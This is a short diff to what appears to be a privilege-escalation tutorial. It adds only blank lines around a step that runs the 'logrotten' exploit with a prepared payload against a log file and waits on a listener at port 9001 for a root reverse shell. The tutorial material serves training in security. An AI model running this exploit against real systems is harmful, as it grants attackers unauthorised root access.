@@ -126,6 +126,8 @@ Listening on 0.0.0.0 9001
 **As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or root.**
 ```
 logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
+
+
 ...
 Listening on 0.0.0.0 9001
 
